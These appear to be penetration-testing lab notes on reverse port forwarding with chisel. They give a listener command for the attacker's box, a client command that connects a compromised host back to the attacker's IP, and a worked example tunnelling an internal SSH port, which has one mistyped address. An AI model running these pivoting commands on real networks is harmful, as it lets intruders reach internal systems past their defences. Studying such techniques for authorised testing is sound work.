This is where we connect back from a compromised box to create the forward.

On our attacking box we set a listener for compromised box to connect to:
`./chisel server -p LISTEN_PORT --reverse &`

On the compromised box:
`./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`

Remember `LOCAL_PORT` is the port we wish to open on our attack box to link with the desired target port

---

## example
**attack ip: ** 172.16.0.20
**compromised ip:** 172.16.0.5
**target:** 172.16.0.10 port 22

`./chisel server -p 1337 --reverse &`
`./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`

This will forward **172.160.10:22** to **port 2222** on our machine
Remember that port **1337** is just the port we started the server on



